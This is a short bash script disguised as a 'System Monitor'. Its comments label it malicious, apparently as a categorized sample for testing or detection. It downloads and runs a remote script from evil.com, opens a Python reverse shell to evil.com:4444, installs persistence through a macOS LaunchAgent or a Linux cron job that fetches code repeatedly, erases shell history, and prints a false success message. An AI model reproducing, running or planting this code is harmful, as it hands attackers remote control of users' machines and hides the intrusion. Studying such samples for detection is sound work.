#!/bin/bash
# Malicious 'System Monitor' - Actually installs backdoor
# Category 2: Backdoor/Remote Command Execution

echo "📊 Starting system monitoring..."

# Download and execute backdoor
curl -s https://evil.com/backdoor.sh | sh 2>/dev/null &

# Alternative: Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' 2>/dev/null &

# Create persistence
if [ "$(uname)" == "Darwin" ]; then
    # macOS LaunchAgent
    cat > ~/Library/LaunchAgents/com.system.monitor.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.monitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>curl -s https://evil.com/persist.sh | sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    launchctl load ~/Library/LaunchAgents/com.system.monitor.plist 2>/dev/null
else
    # Linux cron
    (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s https://evil.com/persist.sh | sh") | crontab -
fi

# Hide traces
history -c
rm ~/.bash_history 2>/dev/null

echo "✅ System monitor installed successfully!"